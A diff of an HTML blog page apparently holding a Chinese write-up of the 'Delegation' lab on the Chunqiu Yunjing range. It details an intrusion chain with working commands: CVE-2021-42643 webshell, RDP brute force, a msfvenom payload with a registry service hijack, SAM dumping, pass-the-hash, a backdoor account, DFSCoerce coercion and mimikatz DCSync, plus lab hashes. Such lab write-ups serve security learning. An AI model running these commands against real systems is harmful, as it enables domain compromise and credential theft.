@@ -8,12 +8,12 @@
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="外网打点 利用 cve-2021-42643,直接访问路由&#x2F;admin admin 123456登入后台  找到模版选项  可以直接进行命令执行，直接写一个一句话shell进去  蚁剑连接成功。 提权 suid 提权看一下 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  有diff可以用这个来查看文件  内网渗透 可以看到有一个提示是win">
+    <meta name="description" content="外网打点利用 cve-2021-42643,直接访问路由&#x2F;admin admin 123456登入后台   找到模版选项   可以直接进行命令执行，直接写一个一句话shell进去   蚁剑连接成功。 提权suid 提权看一下 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null   有diff可以用这个来查看文件   内网渗透可以看到有一">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Delegation-春秋云镜">
 <meta property="og:url" content="https://oceanzbz.github.io/post/2feca376.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="外网打点 利用 cve-2021-42643,直接访问路由&#x2F;admin admin 123456登入后台  找到模版选项  可以直接进行命令执行，直接写一个一句话shell进去  蚁剑连接成功。 提权 suid 提权看一下 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  有diff可以用这个来查看文件  内网渗透 可以看到有一个提示是win">
+<meta property="og:description" content="外网打点利用 cve-2021-42643,直接访问路由&#x2F;admin admin 123456登入后台   找到模版选项   可以直接进行命令执行，直接写一个一句话shell进去   蚁剑连接成功。 提权suid 提权看一下 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null   有diff可以用这个来查看文件   内网渗透可以看到有一">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/post/2feca376/IMAGE20250210180835438.png">
 <meta property="og:image" content="https://oceanzbz.github.io/post/2feca376/IMAGE20250210181131413.png">
@@ -35,8 +35,8 @@
 <meta property="article:modified_time" content="2025-03-07T03:22:00.621Z">
 <meta property="article:author" content="Oceanzbz">
 <meta property="article:tag" content="内网渗透">
-<meta property="article:tag" content="域渗透">
 <meta property="article:tag" content="春秋云镜">
+<meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://oceanzbz.github.io/post/2feca376/IMAGE20250210180835438.png">
     
@@ -202,76 +202,95 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="外网打点">外网打点</h2>
-<p>利用 cve-2021-42643,直接访问路由/admin admin 123456登入后台</p>
+    <h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>利用 cve-2021-42643,直接访问路由&#x2F;admin admin 123456登入后台</p>
 <img src="/post/2feca376/IMAGE20250210180835438.png" class="">
+
 <p>找到模版选项</p>
 <img src="/post/2feca376/IMAGE20250210181131413.png" class="">
+
 <p>可以直接进行命令执行，直接写一个一句话shell进去</p>
 <img src="/post/2feca376/IMAGE20250210181827682.png" class="">
+
 <p>蚁剑连接成功。</p>
-<h2 id="提权">提权</h2>
-<p>suid 提权看一下</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>suid 提权看一下</p>
 <p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
 <img src="/post/2feca376/IMAGE20250210182203907.png" class="">
+
 <p>有diff可以用这个来查看文件</p>
 <img src="/post/2feca376/IMAGE20250210182241625.png" class="">
-<h2 id="内网渗透">内网渗透</h2>
-<p>可以看到有一个提示是windows的域用户，我们传一个fscan扫描一下内网<br>
-扫描记录如下</p>
+
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>可以看到有一个提示是windows的域用户，我们传一个fscan扫描一下内网<br>扫描记录如下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.7:88 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN19</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.45</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.19</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]FILESERVER</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.19</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.7</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]DC01</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.7</span></span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.4.7	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68069  title:中文网页标题</span><br><span class="line">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure>
+
 <p>根据前面flag的提示可以扫描一下win19这台机器</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.45:515 open</span><br><span class="line">172.22.4.45:3389 open</span><br><span class="line">172.22.4.45:15774 open</span><br><span class="line">172.22.4.45:47001 open</span><br><span class="line">172.22.4.45:49664 open</span><br><span class="line">172.22.4.45:49665 open</span><br><span class="line">172.22.4.45:49667 open</span><br><span class="line">172.22.4.45:49666 open</span><br><span class="line">172.22.4.45:49668 open</span><br><span class="line">172.22.4.45:49669 open</span><br><span class="line">172.22.4.45:49671 open</span><br><span class="line">172.22.4.45:49675 open</span><br><span class="line">172.22.4.45:49676 open</span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN19</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.4.45</span></span><br><span class="line">[*] WebTitle http://       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.4.45:47001  code:404 len:315    title:Not Found</span><br></pre></td></tr></table></figure>
+
 <p>发现开启了3389端口，那么我们去爆破一下密码。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l win19\Adrian -P /usr/share/wordlists/rockyou.txt 172.22.4.45 rdp</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</span><br></pre></td></tr></table></figure>
-<p>但是这两个我试了都他妈的报错不知道为啥。然后看了大佬的博客用了下密码<br>
-babygirl1</p>
-<h2 id="注册表提权">注册表提权</h2>
-<p>然后使用 rdesktop 登录上去会提示更改密码这里要提一个<a target="_blank" rel="noopener" href="https://forum.butian.net/share/865">远程更改密码</a><br>
-登录上来之后桌面有一个文件夹是PrivescCheck扫描之后的结果，看一下html即可发现存在注册表提权。</p>
+
+<p>但是这两个我试了都他妈的报错不知道为啥。然后看了大佬的博客用了下密码<br>babygirl1</p>
+<h2 id="注册表提权"><a href="#注册表提权" class="headerlink" title="注册表提权"></a>注册表提权</h2><p>然后使用 rdesktop 登录上去会提示更改密码这里要提一个<a target="_blank" rel="noopener" href="https://forum.butian.net/share/865">远程更改密码</a><br>登录上来之后桌面有一个文件夹是PrivescCheck扫描之后的结果，看一下html即可发现存在注册表提权。</p>
 <img src="/post/2feca376/IMAGE20250211180645966.png" class="">
+
 <p>用msfvenom生成一个木马</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure>
-<p>还要在写一个sam.bat文件</p>
+
+<p>还要在写一个sam.bat文件 </p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system </span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam </span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure>
+
 <p>修改注册表</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Users\Adrian\Desktop\a.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
-<p>然后在cmd中运行</p>
+
+<p>然后在cmd中运行 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure>
+
 <img src="/post/2feca376/IMAGE20250211182043219.png" class="">
+
 <p>此时桌面就会出现三个文件然后拖到kali中解密一下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.4.45 -r disk:test=/root/</span><br></pre></td></tr></table></figure>
+
 <p>这样在远程连接的时候会共享kali的文件夹所以可以直接将目标服务器的文件拖出来，来解密这三个文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptyhon3 secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure>
+
 <img src="/post/2feca376/IMAGE20250211183812308.png" class="">
+
 <p>得到账户的hash</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6b920c07d2b28ccb47de38f0a8edcb90</span><br></pre></td></tr></table></figure>
+
 <p>使用admin账户的hash打一下pth拿下第二个flag</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py administrator@<span class="number">172.22</span>.<span class="number">4.45</span> <span class="literal">-hashes</span> <span class="string">&quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot;</span> <span class="literal">-codec</span> gbk</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>
+
 <img src="/post/2feca376/IMAGE20250211184230211.png" class="">
+
 <p>添加个后门用户方便后续操作</p>
 <img src="/post/2feca376/IMAGE20250211191020272.png" class="">
+
 <p>然后我们利用机器账户的hash去收集下域内的信息</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:6b920c07d2b28ccb47de38f0a8edcb90&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure>
+
 <img src="/post/2feca376/IMAGE20250211184608177.png" class="">
-<h2 id="非约束委派-NtmlRelay-强制认证">非约束委派 + NtmlRelay 强制认证</h2>
-<p>导入bloodhound看一下可以利用的东西可以看到有非约束委派</p>
+
+<h2 id="非约束委派-NtmlRelay-强制认证"><a href="#非约束委派-NtmlRelay-强制认证" class="headerlink" title="非约束委派 + NtmlRelay 强制认证"></a>非约束委派 + NtmlRelay 强制认证</h2><p>导入bloodhound看一下可以利用的东西可以看到有非约束委派</p>
 <img src="/post/2feca376/IMAGE20250211191144321.png" class="">
+
 <p>参考<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1944">红队域渗透NTLM Relay：强制认证方式总结</a>，用DFSCoerce拿域控</p>
-<p>ntmlrelay攻击原理：<br>
-<a target="_blank" rel="noopener" href="https://qingwan.top/2024/01/23/ntlm%20relay/">https://qingwan.top/2024/01/23/ntlm relay/</a><br>
-<a target="_blank" rel="noopener" href="https://www.geekby.site/2021/09/ntlm-relay/#3-%E5%AE%9E%E6%88%98">https://www.geekby.site/2021/09/ntlm-relay/#3-实战</a></p>
+<p>ntmlrelay攻击原理：<br><a target="_blank" rel="noopener" href="https://qingwan.top/2024/01/23/ntlm%20relay/">https://qingwan.top/2024/01/23/ntlm%20relay/</a><br><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/09/ntlm-relay/#3-%E5%AE%9E%E6%88%98">https://www.geekby.site/2021/09/ntlm-relay/#3-%E5%AE%9E%E6%88%98</a></p>
 <p>先用Rubeus.exe监听</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure>
+
 <p>然后使用dfscoerce强制访问获得域控的tgt导入lass</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dfscoerce.py -u win19$ -hashes &quot;aad3b435b51404eeaad3b435b51404ee:6b920c07d2b28ccb47de38f0a8edcb90&quot; -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure>
 <img src="/post/2feca376/IMAGE20250211192849923.png" class="">
+
 <p>获得base64加密的tgt然后本地解密保存问kirbi，然后传一个mimikatz 上去导入进去</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
 <img src="/post/2feca376/IMAGE20250211194346084.png" class="">
+
 <p>获取到hash然后打pth <code>4889f6553239ace1f7c47fa2c619c252</code></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19</span><br></pre></td></tr></table></figure>
 <img src="/post/2feca376/IMAGE20250211194812631.png" class="">
+
 <p>在横到另一台机器上去</p>
 <img src="/post/2feca376/IMAGE20250211194906204.png" class="">
   </div>
